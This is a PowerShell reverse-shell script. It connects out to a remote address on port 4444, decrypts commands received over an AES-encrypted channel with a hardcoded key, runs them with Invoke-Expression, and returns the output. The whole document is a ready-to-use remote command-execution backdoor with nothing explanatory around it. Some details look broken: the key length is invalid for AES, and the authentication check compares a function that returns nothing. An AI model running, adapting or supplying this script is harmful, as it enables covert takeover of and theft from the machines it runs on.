# Define target IP address and port
$targetIP = '192.xxx.xxx.xxx'
$targetPort = '4444'

# Define a secure key for encryption (must match on both ends)
$encryptionKey = "SecureKey12345678"

# Function to encrypt data using AES
function Encrypt-Data {
    param ($data, $key)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key)
    $aes.IV = [System.Text.Encoding]::UTF8.GetBytes($key.Substring(0, 16))
    $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
    $memoryStream = New-Object System.IO.MemoryStream
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $streamWriter = New-Object System.IO.StreamWriter($cryptoStream)
    $streamWriter.Write($data)
    $streamWriter.Close()
    $cryptoStream.Close()
    $memoryStream.Close()
    return [System.Convert]::ToBase64String($memoryStream.ToArray())
}

# Function to decrypt data using AES
function Decrypt-Data {
    param ($data, $key)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key)
    $aes.IV = [System.Text.Encoding]::UTF8.GetBytes($key.Substring(0, 16))
    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
    $memoryStream = New-Object System.IO.MemoryStream([System.Convert]::FromBase64String($data))
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $streamReader = New-Object System.IO.StreamReader($cryptoStream)
    $decryptedData = $streamReader.ReadToEnd()
    $streamReader.Close()
    $cryptoStream.Close()
    $memoryStream.Close()
    return $decryptedData
}

# Create a new TCP client object
try {
    $tcpClient = New-Object System.Net.Sockets.TCPClient($targetIP, $targetPort)
    Write-Host "Connected to ${targetIP}:${targetPort}"
} catch {
    Write-Error "Failed to connect to ${targetIP}:${targetPort}"
    exit
}

# Get the network stream from the TCP client
$networkStream = $tcpClient.GetStream()

# Define a function to send data over the network
function Send-Data {
    param ($data)
    try {
        # Encrypt the data before sending
        $encryptedData = Encrypt-Data -data $data -key $encryptionKey
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($encryptedData)
        $networkStream.Write($bytes, 0, $bytes.Length)
    } catch {
        Write-Error "Failed to send data: $_"
    }
}

# Define a function to read data from the network
function Read-Data {
    try {
        $buffer = New-Object Byte[] 65536
        while (($bytesRead = $networkStream.Read($buffer, 0, $buffer.Length)) -ne 0) {
            $encryptedData = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
            $decryptedData = Decrypt-Data -data $encryptedData -key $encryptionKey
            
            # Execute the command on the local host
            try {
                $output = Invoke-Expression -Command $decryptedData 2>&1 | Out-String
                Send-Data -data $output
            } catch {
                Write-Error "Failed to execute command: $_"
                Send-Data -data "Error: $_"
            }
        }
    } catch {
        Write-Error "Failed to read data: $_"
    }
}

# Authenticate the connection
$authResponse = Read-Data
if ($authResponse -ne "AUTH_SUCCESS") {
    Write-Error "Authentication failed"
    $tcpClient.Close()
    exit
}

# Start sending and receiving data
Send-Data -data "Ready for commands"
Read-Data

# Close the TCP client connection
$tcpClient.Close()
Write-Host "Connection closed"